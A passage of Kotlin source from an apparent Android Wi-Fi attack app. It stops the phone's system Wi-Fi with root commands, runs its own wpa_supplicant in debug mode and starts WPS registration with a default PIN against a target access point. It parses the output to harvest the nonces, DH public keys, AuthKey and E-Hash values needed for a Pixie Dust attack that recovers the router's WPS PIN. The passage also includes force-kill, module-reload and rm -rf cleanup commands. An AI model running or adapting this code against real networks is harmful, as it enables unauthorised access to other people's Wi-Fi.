                    callbacks.onLogEntry(LogEntry("✓ Directory is writable", LogColorType.SUCCESS))
                } else {
                    callbacks.onLogEntry(LogEntry("⚠ Directory write test failed", LogColorType.ERROR))
                }

                val ourProcessCheck = Shell.cmd("ps aux | grep $binaryDir | grep -v grep").exec()
                if (ourProcessCheck.out.isEmpty()) {
                    callbacks.onLogEntry(LogEntry("✓ No processes using our directory", LogColorType.SUCCESS))
                } else {
                    callbacks.onLogEntry(LogEntry("⚠ Some processes still using our directory", LogColorType.ERROR))
                }

                callbacks.onLogEntry(LogEntry("✓ Binary cleanup verification completed", LogColorType.SUCCESS))

            } catch (e: Exception) {
                callbacks.onLogEntry(LogEntry("Final verification error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    suspend fun forceStopAllProcesses() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Force stopping all processes...", LogColorType.INFO))

                try {
                    supplicantProcess?.destroy()
                    supplicantOutput?.close()
                    supplicantProcess = null
                    supplicantOutput = null
                } catch (e: Exception) {
                    Log.w(TAG, "Error closing supplicant streams", e)
                }

                val killCommands = listOf(
                    "pkill -9 -f wpa_supplicant",
                    "pkill -9 -f wpa_cli",
                    "pkill -9 -f pixiedust",
                    "killall -9 wpa_supplicant",
                    "killall -9 wpa_cli",
                    "killall -9 pixiedust",
                    "pkill -9 -f $binaryDir",
                    "fuser -k $binaryDir/wpa_supplicant* 2>/dev/null || true",
                    "fuser -k $binaryDir/wpa_cli* 2>/dev/null || true",
                    "ps aux | grep wpa_supplicant | grep -v grep | awk '{print \$2}' | xargs kill -9 2>/dev/null || true",
                    "ps aux | grep wpa_cli | grep -v grep | awk '{print \$2}' | xargs kill -9 2>/dev/null || true"
                )

                killCommands.forEach { command ->
                    try {
                        Shell.cmd(command).exec()
                        delay(200)
                    } catch (e: Exception) {
                        Log.w(TAG, "Kill command failed: $command", e)
                    }
                }

                val socketDirs = listOf(
                    "/data/vendor/wifi/wpa/wififrankenstein/",
                    "/data/misc/wifi/wififrankenstein/"
                )

                socketDirs.forEach { dir ->
                    Shell.cmd("rm -rf $dir").exec()
                }

                callbacks.onLogEntry(LogEntry("All processes terminated", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.w(TAG, "Error force stopping processes", e)
                callbacks.onLogEntry(LogEntry("Error stopping processes: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    fun forceCleanup() {
        scope.launch {
            forceStopAllProcesses()
            delay(1000)
            cleanupAfterAttack()
        }
    }

    private suspend fun restoreWifiState() {
        withContext(Dispatchers.IO) {
            try {
                if (useAggressiveCleanup) {
                    restoreWifiStateAggressive()
                } else {
                    restoreWifiStateSimple()
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error restoring WiFi state", e)
                callbacks.onLogEntry(LogEntry("WiFi restore error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun restoreWifiStateSimple() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Enabling WiFi...", LogColorType.INFO))

                try {
                    @Suppress("DEPRECATION")
                    wifiManager.isWifiEnabled = true
                    delay(5000)
                    callbacks.onLogEntry(LogEntry("WiFi enabled", LogColorType.SUCCESS))
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to enable WiFi via WifiManager, trying alternative", e)

                    val enableCommands = listOf(
                        "echo 0 > /sys/class/net/wlan0/device/rf_kill",
                        "svc wifi enable",
                        "ifconfig wlan0 up",
                        "ip link set wlan0 up"
                    )

                    enableCommands.forEach { command ->
                        try {
                            Shell.cmd(command).exec()
                            delay(1000)
                        } catch (_: Exception) {
                            Log.w(TAG, "Enable command failed: $command")
                        }
                    }

                    callbacks.onLogEntry(LogEntry("WiFi enabled via root commands", LogColorType.SUCCESS))
                }

            } catch (e: Exception) {
                Log.w(TAG, "Error in simple WiFi enable", e)
                callbacks.onLogEntry(LogEntry("Error enabling WiFi: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun restoreWifiStateAggressive() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Performing full WiFi reset...", LogColorType.INFO))

                val wifiResetCommands = listOf(
                    "echo 0 > /sys/class/net/wlan0/device/rf_kill",
                    "echo 1 > /sys/class/net/wlan0/device/rf_kill",
                    "echo 0 > /sys/class/net/wlan0/device/rf_kill"
                )

                wifiResetCommands.forEach { command ->
                    try {
                        Shell.cmd(command).exec()
                        delay(1000)
                    } catch (_: Exception) {
                        Log.w(TAG, "RF kill command failed: $command")
                    }
                }

                callbacks.onLogEntry(LogEntry("Reloading WiFi module...", LogColorType.INFO))
                val moduleCommands = listOf(
                    "rmmod wlan",
                    "sleep 2",
                    "modprobe wlan",
                    "svc wifi enable"
                )

                moduleCommands.forEach { command ->
                    try {
                        Shell.cmd(command).exec()
                        delay(2000)
                    } catch (_: Exception) {
                        Log.w(TAG, "Module command failed: $command")
                    }
                }

                callbacks.onLogEntry(LogEntry("Software WiFi reset...", LogColorType.INFO))
                try {
                    @Suppress("DEPRECATION")
                    wifiManager.isWifiEnabled = false
                    delay(5000)
                    @Suppress("DEPRECATION")
                    wifiManager.isWifiEnabled = true
                    delay(5000)
                    callbacks.onLogEntry(LogEntry("WiFi software reset completed", LogColorType.SUCCESS))
                } catch (e: Exception) {
                    Log.w(TAG, "Software WiFi reset failed", e)
                    callbacks.onLogEntry(LogEntry("Software reset failed: ${e.message}", LogColorType.ERROR))
                }

                callbacks.onLogEntry(LogEntry("Cleaning temporary files only...", LogColorType.INFO))
                val cleanupCommands = listOf(
                    "rm -rf /data/misc/wifi/wififrankenstein/",
                    "rm -rf /data/vendor/wifi/wpa/wififrankenstein/",
                    "killall -HUP wpa_supplicant 2>/dev/null || true"
                )

                cleanupCommands.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(200)
                }

                callbacks.onLogEntry(LogEntry("WiFi state restored with saved networks", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.w(TAG, "Error in full WiFi restore", e)
                callbacks.onLogEntry(LogEntry("WiFi restore error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private fun getSocketDirectory(): String {
        return if (Build.VERSION.SDK_INT >= 28) {
            "/data/vendor/wifi/wpa/wififrankenstein/"
        } else {
            "/data/misc/wifi/wififrankenstein/"
        }
    }

    private suspend fun startSupplicant(socketDir: String, interfaceName: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                Log.d(TAG, "Starting completely isolated wpa_supplicant on interface $interfaceName")
                callbacks.onLogEntry(LogEntry("Starting isolated wpa_supplicant on $interfaceName", LogColorType.INFO))

                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"

                Shell.cmd("rm -rf $socketDir").exec()
                Shell.cmd("mkdir -p $socketDir").exec()
                Shell.cmd("chmod 777 $socketDir").exec()

                val isolatedConfigDir = "$binaryDir/isolated_config"
                var isolatedConfigPath = "$isolatedConfigDir/wpa_supplicant.conf"

                callbacks.onLogEntry(LogEntry("Creating isolated configuration...", LogColorType.INFO))
                createCompletelyIsolatedConfig(isolatedConfigPath)

                delay(1000)

                if (!Shell.cmd("test -f $isolatedConfigPath").exec().isSuccess) {
                    callbacks.onLogEntry(LogEntry("Config file not created, using default config", LogColorType.ERROR))
                    isolatedConfigPath = "$binaryDir/$CONFIG_FILE"
                }

                val command = """
                cd $binaryDir && \
                export LD_LIBRARY_PATH=$binaryDir && \
                export WPA_TRACE_LEVEL=99 && \
                unset ANDROID_DATA && \
                unset ANDROID_ROOT && \
                unset ANDROID_STORAGE && \
                export HOME=$isolatedConfigDir && \
                export TMPDIR=$isolatedConfigDir && \
                ./wpa_supplicant$arch -dd -K -Dnl80211,wext,hostapd,wired -i $interfaceName -c$isolatedConfigPath -O$socketDir -P$isolatedConfigDir/wpa_supplicant.pid
            """.trimIndent()

                supplicantProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
                supplicantOutput = BufferedReader(InputStreamReader(supplicantProcess!!.inputStream))

                scope.launch {
                    var line: String?
                    while (supplicantOutput?.readLine().also { line = it } != null) {
                        line?.let { parseLine(it) }
                    }
                    Log.d(TAG, "wpa_supplicant output ended")
                }

                val socketFile = "$socketDir/$interfaceName"
                val startTime = System.currentTimeMillis()
                while (System.currentTimeMillis() - startTime < 15000) {
                    if (Shell.cmd("test -S $socketFile").exec().isSuccess) {
                        Log.d(TAG, "Control socket created")
                        callbacks.onLogEntry(LogEntry("Successfully started isolated wpa_supplicant", LogColorType.INFO))
                        return@withContext true
                    }
                    delay(500)
                }

                Log.e(TAG, "Failed to create control socket within timeout")
                callbacks.onLogEntry(LogEntry("Failed to create control socket within timeout", LogColorType.ERROR))

                callbacks.onLogEntry(LogEntry("Checking wpa_supplicant process status...", LogColorType.INFO))
                val psResult = Shell.cmd("ps aux | grep wpa_supplicant | grep -v grep").exec()
                if (psResult.isSuccess && psResult.out.isNotEmpty()) {
                    callbacks.onLogEntry(LogEntry("wpa_supplicant process is running", LogColorType.INFO))
                } else {
                    callbacks.onLogEntry(LogEntry("wpa_supplicant process not found", LogColorType.ERROR))
                }

                false
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start wpa_supplicant", e)
                callbacks.onLogEntry(LogEntry("Failed to start wpa_supplicant: ${e.message}", LogColorType.ERROR))
                false
            }
        }
    }

    private suspend fun createConfigViaShell(configPath: String) {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Creating config via shell commands...", LogColorType.INFO))

                val configDir = java.io.File(configPath).parent

                val createCommands = listOf(
                    "mkdir -p $configDir",
                    "chmod 755 $configDir",
                    "cat > $configPath << 'EOF'\nctrl_interface_group=wifi\nupdate_config=0",
                    "chmod 644 $configPath"
                )

                createCommands.forEach { command ->
                    val result = Shell.cmd(command).exec()
                    if (!result.isSuccess) {
                        Log.w(TAG, "Command failed: $command")
                        callbacks.onLogEntry(LogEntry("Warning: $command failed", LogColorType.ERROR))
                    }
                    delay(100)
                }

                val verifyResult = Shell.cmd("test -f $configPath && echo 'EXISTS' || echo 'MISSING'").exec()
                if (verifyResult.isSuccess && verifyResult.out.contains("EXISTS")) {
                    callbacks.onLogEntry(LogEntry("Config created successfully via shell", LogColorType.SUCCESS))
                } else {
                    callbacks.onLogEntry(LogEntry("Config creation via shell failed", LogColorType.ERROR))
                }

            } catch (e: Exception) {
                Log.e(TAG, "Failed to create config via shell", e)
                callbacks.onLogEntry(LogEntry("Shell config creation error: ${e.message}", LogColorType.ERROR))
            }
        }
    }


    private suspend fun createCompletelyIsolatedConfig(configPath: String) {
        withContext(Dispatchers.IO) {
            try {
                val isolatedConfig = """
ctrl_interface_group=wifi
update_config=0
            """.trimIndent()

                val configDir = java.io.File(configPath).parent

                Shell.cmd("mkdir -p $configDir").exec()
                Shell.cmd("chmod 755 $configDir").exec()

                val tempConfigPath = "$binaryDir/temp_isolated_config.txt"

                try {
                    context.openFileOutput("temp_isolated_config.txt", Context.MODE_PRIVATE).use { output ->
                        output.write(isolatedConfig.toByteArray())
                    }

                    Shell.cmd("cp $tempConfigPath $configPath").exec()
                    Shell.cmd("chmod 644 $configPath").exec()
                    Shell.cmd("rm -f $tempConfigPath").exec()

                    val verifyResult = Shell.cmd("test -f $configPath && echo 'OK' || echo 'FAIL'").exec()
                    if (!verifyResult.isSuccess || !verifyResult.out.contains("OK")) {
                        throw Exception("Config file verification failed")
                    }

                } catch (e: Exception) {
                    Log.w(TAG, "Standard method failed, trying shell method", e)
                    createConfigViaShell(configPath)
                }

            } catch (e: Exception) {
                Log.e(TAG, "All config creation methods failed", e)
                callbacks.onLogEntry(LogEntry("Failed to create isolated config: ${e.message}", LogColorType.ERROR))
                callbacks.onLogEntry(LogEntry("Using default config as fallback", LogColorType.ERROR))
            }
        }
    }

    private var currentBssid: String = ""
    private var currentEssid: String = ""
    private var wpsProcessStarted = false
    private var notVulnerableWarningShown = false

    private fun parseLine(line: String) {
        Log.d("WPA-SUP", line)

        when {
            line.contains("No suitable network found") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_waiting_target), LogColorType.NORMAL))
            }

            line.contains("nl80211: Connect request send successfully") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_auth_request), LogColorType.SUCCESS))
            }

            line.contains("Request association with") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_assoc_request), LogColorType.SUCCESS))
            }

            line.contains("Association info event") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_connected_to_ap), LogColorType.SUCCESS))
            }

            line.contains("Associated with") && line.contains("nl80211:") -> {
                val bssidMatch = "Associated with ([0-9a-fA-F:]{17})".toRegex().find(line)
                bssidMatch?.let {
                    currentBssid = it.groupValues[1]
                    if (currentEssid.isNotEmpty()) {
                        callbacks.onLogEntry(LogEntry(
                            context.getString(R.string.pixie_log_associated, currentBssid, currentEssid),
                            LogColorType.SUCCESS
                        ))
                    }
                }
            }

            line.contains("Set drv->ssid based on scan res info to") -> {
                val essidMatch = "Set drv->ssid based on scan res info to '([^']*)'".toRegex().find(line)
                essidMatch?.let {
                    currentEssid = it.groupValues[1]
                    if (currentBssid.isNotEmpty()) {
                        callbacks.onLogEntry(LogEntry(
                            context.getString(R.string.pixie_log_associated, currentBssid, currentEssid),
                            LogColorType.SUCCESS
                        ))
                    }
                }
            }

            line.contains("EAPOL: txStart") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_eapol_start), LogColorType.SUCCESS))
            }

            line.contains("EAP-Request Identity") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_identity_response), LogColorType.SUCCESS))
            }

            line.contains("EAP-Request id=") && line.contains("method=1") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_identity_request), LogColorType.SUCCESS))
            }

            line.contains("WPS: Received M1") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m1_received), LogColorType.SUCCESS))
                wpsProcessStarted = true
            }

            line.contains("WPS: Building Message M2") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m2_sending), LogColorType.SUCCESS))
            }

            line.contains("WPS: Received M3") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m3_received), LogColorType.SUCCESS))
            }

            line.contains("WPS: Building Message M4") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m4_sending), LogColorType.SUCCESS))
            }

            line.contains("WPS: Received M5") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m5_received), LogColorType.SUCCESS))
            }

            line.contains("WPS: Building Message M6") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m6_sending), LogColorType.SUCCESS))
            }

            line.contains("WPS: Received M7") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m7_received), LogColorType.SUCCESS))
            }

            line.contains("WPS: Received M8") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m8_received), LogColorType.SUCCESS))
            }

            line.contains("WPS: Received WSC_NACK") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_wsc_nack_received), LogColorType.ERROR))

                val configErrorMatch = "Configuration Error (\\d+)".toRegex().find(line)
                configErrorMatch?.let {
                    val errorCode = it.groupValues[1].toInt()
                    val errorDescription = getWpsConfigErrorDescription(errorCode)
                    callbacks.onLogEntry(LogEntry(
                        context.getString(R.string.pixie_log_deauth_reason, errorDescription),
                        LogColorType.ERROR
                    ))
                }
            }

            line.contains("WPS: Enrollee terminated negotiation with Configuration Error") -> {
                val errorMatch = "Configuration Error (\\d+)".toRegex().find(line)
                errorMatch?.let {
                    val errorCode = it.groupValues[1].toInt()
                    val errorDescription = getWpsConfigErrorDescription(errorCode)
                    callbacks.onLogEntry(LogEntry(
                        context.getString(R.string.pixie_log_deauth_reason, errorDescription),
                        LogColorType.ERROR
                    ))
                }
            }

            line.contains("WPS: Building Message WSC_NACK") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_wsc_nack_sending), LogColorType.SUCCESS))
            }

            line.contains("EAPOL: enable timer tick") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_wps_cycle_started), LogColorType.HIGHLIGHT))
            }

            line.contains("EAPOL: disable timer tick") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_wps_cycle_ended), LogColorType.NORMAL))
            }

            line.contains("Event DEAUTH") || line.contains("Event DISCONNECT") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_connection_lost), LogColorType.ERROR))
            }

            line.contains("Enrollee Nonce") && line.contains("hexdump(len=16):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["enrolleeNonce"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_enrollee_nonce), LogColorType.SUCCESS))
                }
            }

            line.contains("DH own Public Key") && line.contains("hexdump(len=192):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["ownPublicKey"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_own_public_key), LogColorType.SUCCESS))
                }
            }

            line.contains("DH peer Public Key") && line.contains("hexdump(len=192):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["peerPublicKey"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_peer_public_key), LogColorType.SUCCESS))
                }
            }

            line.contains("AuthKey") && line.contains("hexdump(len=32):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null && !hex.contains("[REMOVED]")) {
                    pixieData["authenticationKey"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_authkey), LogColorType.SUCCESS))
                }
            }

            line.contains("E-Hash1") && line.contains("hexdump(len=32):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["hashOne"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_e_hash1), LogColorType.SUCCESS))
                }
            }

            line.contains("E-Hash2") && line.contains("hexdump(len=32):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["hashTwo"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_e_hash2), LogColorType.SUCCESS))

                    if (pixieDataProgress == totalPixieDataFields) {
                        callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_all_data_collected), LogColorType.HIGHLIGHT))
                    }
                }
            }

            line.contains("PSK1") && line.contains("hexdump(len=16):") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_psk1), LogColorType.SUCCESS))
            }

            line.contains("PSK2") && line.contains("hexdump(len=16):") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_psk2), LogColorType.SUCCESS))
            }

            line.contains("R-S1") && line.contains("hexdump(len=16):") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_r_s1), LogColorType.SUCCESS))
            }

            line.contains("R-S2") && line.contains("hexdump(len=16):") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_r_s2), LogColorType.SUCCESS))
            }

            line.contains("R-Hash1") && line.contains("hexdump(len=32):") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_r_hash1), LogColorType.SUCCESS))
            }

            line.contains("R-Hash2") && line.contains("hexdump(len=32):") -> {
                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_r_hash2), LogColorType.SUCCESS))
            }

            line.contains("CTRL-EVENT-ASSOC-REJECT") -> {
                val statusCode = extractStatusCode(line)
                val bssid = extractBssid(line)
                val message = getAssocRejectMessage(statusCode)
                callbacks.onLogEntry(LogEntry("⚠ $message (BSSID: $bssid)", LogColorType.ERROR))
            }
        }

        if (wpsProcessStarted && pixieDataProgress == 4 && !notVulnerableWarningShown) {
            notVulnerableWarningShown = true
            callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_possibly_not_vulnerable), LogColorType.ERROR))
        }
    }

    private fun getWpsConfigErrorDescription(errorCode: Int): String {
        return when (errorCode) {
            0 -> context.getString(R.string.wps_config_error_0)
            1 -> context.getString(R.string.wps_config_error_1)
            2 -> context.getString(R.string.wps_config_error_2)
            3 -> context.getString(R.string.wps_config_error_3)
            4 -> context.getString(R.string.wps_config_error_4)
            5 -> context.getString(R.string.wps_config_error_5)
            6 -> context.getString(R.string.wps_config_error_6)
            7 -> context.getString(R.string.wps_config_error_7)
            8 -> context.getString(R.string.wps_config_error_8)
            9 -> context.getString(R.string.wps_config_error_9)
            10 -> context.getString(R.string.wps_config_error_10)
            11 -> context.getString(R.string.wps_config_error_11)
            12 -> context.getString(R.string.wps_config_error_12)
            13 -> context.getString(R.string.wps_config_error_13)
            14 -> context.getString(R.string.wps_config_error_14)
            15 -> context.getString(R.string.wps_config_error_15)
            16 -> context.getString(R.string.wps_config_error_16)
            17 -> context.getString(R.string.wps_config_error_17)
            18 -> context.getString(R.string.wps_config_error_18)
            else -> context.getString(R.string.wps_config_error_default, errorCode)
        }
    }

    private fun extractStatusCode(line: String): Int {
        return try {
            val statusMatch = "status_code=(\\d+)".toRegex().find(line)
            statusMatch?.groupValues?.get(1)?.toInt() ?: -1
        } catch (_: Exception) {
            -1
        }
    }

    private fun extractBssid(line: String): String {
        return try {
            val bssidMatch = "bssid=([0-9a-fA-F:]{17})".toRegex().find(line)
            bssidMatch?.groupValues?.get(1) ?: "unknown"
        } catch (_: Exception) {
            "unknown"
        }
    }

    private fun getAssocRejectMessage(statusCode: Int): String {
        return when (statusCode) {
            1 -> context.getString(R.string.assoc_reject_unspecified)
            2 -> context.getString(R.string.assoc_reject_prev_auth_invalid)
            3 -> context.getString(R.string.assoc_reject_deauth_leaving)
            4 -> context.getString(R.string.assoc_reject_inactivity)
            5 -> context.getString(R.string.assoc_reject_ap_overload)
            6 -> context.getString(R.string.assoc_reject_class2_frame)
            7 -> context.getString(R.string.assoc_reject_class3_frame)
            8 -> context.getString(R.string.assoc_reject_leaving_bss)
            9 -> context.getString(R.string.assoc_reject_not_authenticated)
            10 -> context.getString(R.string.assoc_reject_power_capability)
            11 -> context.getString(R.string.assoc_reject_supported_channels)
            13 -> context.getString(R.string.assoc_reject_invalid_ie)
            14 -> context.getString(R.string.assoc_reject_mic_failure)
            15 -> context.getString(R.string.assoc_reject_4way_timeout)
            16 -> context.getString(R.string.assoc_reject_group_timeout)
            17 -> context.getString(R.string.assoc_reject_ie_different)
            18 -> context.getString(R.string.assoc_reject_invalid_group_cipher)
            19 -> context.getString(R.string.assoc_reject_invalid_pairwise_cipher)
            20 -> context.getString(R.string.assoc_reject_invalid_akmp)
            21 -> context.getString(R.string.assoc_reject_unsupported_rsn)
            22 -> context.getString(R.string.assoc_reject_invalid_rsn_capabilities)
            23 -> context.getString(R.string.assoc_reject_8021x_failed)
            24 -> context.getString(R.string.assoc_reject_cipher_rejected)
            32 -> context.getString(R.string.assoc_reject_load_balancing)
            else -> context.getString(R.string.assoc_reject_unknown, statusCode)
        }
    }

    private suspend fun performWpsRegistration(network: WpsNetwork, socketDir: String, interfaceName: String) {
        withContext(Dispatchers.IO) {
            try {
                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val socketPath = "$socketDir/$interfaceName"

                Log.d(TAG, "Starting WPS registration for BSSID: ${network.bssid}")
                callbacks.onLogEntry(LogEntry("Starting WPS registration for ${network.bssid}", LogColorType.INFO))

                val command = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -i $interfaceName -p $socketPath wps_reg ${network.bssid} $DEFAULT_PIN"
                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))

                val outputReader = BufferedReader(InputStreamReader(process.inputStream))
                val errorReader = BufferedReader(InputStreamReader(process.errorStream))

                val outputLines = mutableListOf<String>()
                val errorLines = mutableListOf<String>()

                val outputJob = scope.async {
                    try {
                        var line: String?
                        while (outputReader.readLine().also { line = it } != null) {
                            line?.let {
                                outputLines.add(it)
                                parseWpaCliLine(it)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error reading wpa_cli output", e)
                    }
                }

                val errorJob = scope.async {
                    try {
                        var line: String?
                        while (errorReader.readLine().also { line = it } != null) {
                            line?.let {
                                errorLines.add(it)
                                Log.w("WPA_CLI_ERR", it)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error reading wpa_cli error output", e)
                    }
                }

                val exitCode = process.waitFor()

                outputJob.await()
                errorJob.await()

                outputReader.close()
                errorReader.close()

                Log.d(TAG, "wpa_cli finished with exit code: $exitCode")
                callbacks.onLogEntry(LogEntry("WPS registration completed", LogColorType.INFO))

            } catch (e: Exception) {
                Log.w(TAG, "WPS registration failed", e)
                callbacks.onLogEntry(LogEntry("WPS registration failed: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private fun parseWpaCliLine(line: String) {
        Log.d("WPA_CLI", "Output: $line")
        when {
            line.contains("OK") -> {
                Log.d(TAG, "wpa_cli: Command executed successfully")
            }
            line.contains("FAIL") -> {
                Log.w(TAG, "wpa_cli: Command failed: $line")
                callbacks.onLogEntry(LogEntry("wpa_cli command failed", LogColorType.ERROR))
            }
            line.contains("WPS-") -> {
                Log.d(TAG, "wpa_cli: WPS event: $line")
                callbacks.onLogEntry(LogEntry("WPS event: $line"))
            }
        }
    }

    private suspend fun stopExistingProcesses() {
        withContext(Dispatchers.IO) {
            try {
                if (useAggressiveCleanup) {
                    stopExistingProcessesAggressive()
                } else {
                    stopExistingProcessesSimple()
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping processes", e)
                callbacks.onLogEntry(LogEntry("Error stopping processes: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun stopExistingProcessesSimple() {
        withContext(Dispatchers.IO) {
            try {
                Log.d(TAG, "Using simple WiFi disable")
                callbacks.onLogEntry(LogEntry("Disabling WiFi...", LogColorType.INFO))

                try {
                    @Suppress("DEPRECATION")
                    wifiManager.isWifiEnabled = false
                    delay(3000)
                    callbacks.onLogEntry(LogEntry("WiFi disabled", LogColorType.SUCCESS))
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to disable WiFi via WifiManager, trying alternative", e)

                    val disableCommands = listOf(
                        "svc wifi disable"
                    )

                    disableCommands.forEach { command ->
                        try {
                            Shell.cmd(command).exec()
                            delay(500)
                        } catch (_: Exception) {
                            Log.w(TAG, "Disable command failed: $command")
                        }
                    }

                    callbacks.onLogEntry(LogEntry("WiFi disabled via root commands", LogColorType.SUCCESS))
                }

            } catch (e: Exception) {
                Log.w(TAG, "Error in simple WiFi disable", e)
                callbacks.onLogEntry(LogEntry("Error disabling WiFi: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun stopExistingProcessesAggressive() {
        withContext(Dispatchers.IO) {
            try {
                Log.d(TAG, "Safely stopping system WiFi services")
                callbacks.onLogEntry(LogEntry("Safely stopping system WiFi services...", LogColorType.INFO))

                callbacks.onLogEntry(LogEntry("Disabling auto-connect temporarily...", LogColorType.INFO))
                val disableAutoConnect = listOf(
                    "settings put global wifi_networks_available_notification_on 0",
                    "settings put global wifi_scan_always_enabled 0",
                    "settings put global wifi_sleep_policy 0",
                    "settings put secure wifi_watchdog_on 0"
                )

                disableAutoConnect.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(200)
                }

                callbacks.onLogEntry(LogEntry("Stopping system WiFi services...", LogColorType.INFO))
                val stopServices = listOf(
                    "svc wifi disable",
                    "stop wifihal",
                    "stop wifi",
                    "stop wpa_supplicant",
                    "stop dhcpcd",
                    "setprop ctl.stop wpa_supplicant",
                    "setprop ctl.stop wifi"
                )

                stopServices.forEach { command ->
                    val result = Shell.cmd(command).exec()
                    if (result.isSuccess) {
                        callbacks.onLogEntry(LogEntry("✓ $command", LogColorType.SUCCESS))
                    } else {
                        callbacks.onLogEntry(LogEntry("⚠ $command failed", LogColorType.ERROR))
                    }
                    delay(500)
                }

                callbacks.onLogEntry(LogEntry("Killing WiFi processes...", LogColorType.INFO))
                val killCommands = listOf(
                    "pkill -9 -f wpa_supplicant",
                    "pkill -9 -f hostapd",
                    "pkill -9 -f dhcpcd",
                    "pkill -9 -f wifihal",
                    "killall -9 wpa_supplicant",
                    "killall -9 hostapd",
                    "killall -9 dhcpcd",
                    "ps aux | grep wpa | grep -v grep | awk '{print \$2}' | xargs kill -9 2>/dev/null || true",
                    "ps aux | grep wifi | grep -v grep | awk '{print \$2}' | xargs kill -9 2>/dev/null || true"
                )

                killCommands.forEach { command ->
                    try {
                        Shell.cmd(command).exec()
                        delay(300)
                    } catch (_: Exception) {
                        Log.w(TAG, "Kill command failed: $command")
                    }
                }

                callbacks.onLogEntry(LogEntry("Preparing isolated WiFi interface...", LogColorType.INFO))
                val interfaceCommands = listOf(
                    "svc wifi disable",
                    "ifconfig wlan0 down",
                    "ip link set wlan0 down",
                    "iw dev wlan0 disconnect"
                )

                interfaceCommands.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(500)
                }

                callbacks.onLogEntry(LogEntry("Clearing our temporary files only...", LogColorType.INFO))
                val clearCommands = listOf(
                    "rm -rf /data/misc/wifi/wififrankenstein/",
                    "rm -rf /data/vendor/wifi/wpa/wififrankenstein/"
                )

                clearCommands.forEach { command ->
                    Shell.cmd(command).exec()
                }

                delay(3000)
                callbacks.onLogEntry(LogEntry("System safely isolated", LogColorType.SUCCESS))

